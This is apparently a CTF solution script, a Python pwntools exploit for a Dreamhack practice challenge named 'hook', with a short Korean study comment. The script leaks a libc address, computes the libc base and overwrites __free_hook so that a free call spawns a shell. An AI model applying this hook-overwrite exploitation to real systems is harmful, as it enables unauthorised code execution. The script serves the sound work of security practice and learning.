#!/usr/bin/python3

import pwn

p = pwn.remote("host1.dreamhack.games", 21129)
e = pwn.ELF("./hook")
libc = pwn.ELF("./libc.so.6")
pwn.context.log_level = 'debug'

system = 0x400a11

p.recvuntil("stdout: ")
stdout = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)
pwn.log.info("stdout: " + hex(stdout))

libcBase = stdout - libc.symbols['_IO_2_1_stdout_']
pwn.log.info("libc Base Address: " + hex(libcBase))

freeHook = libcBase + libc.symbols['__free_hook']

payload = pwn.p64(freeHook) + pwn.p64(system)

p.sendlineafter("Size: ", "200")

p.sendlineafter("Data: ", payload)

p.interactive()

"""
oneshoot gadget을 사용해도 가능하지만 기본적으로 main에 "/bin/sh"를 인자로 system 함수를 실행하는 구문이 있다.
근데 그 이전에 double free가 존재하는데 이로인해 abort? 가 발생해서 그 이후가 실행이 안되게 하는 것 같다.
https://koharinn.tistory.com/236
저거 관련해서도 정리해야겠다.
"""
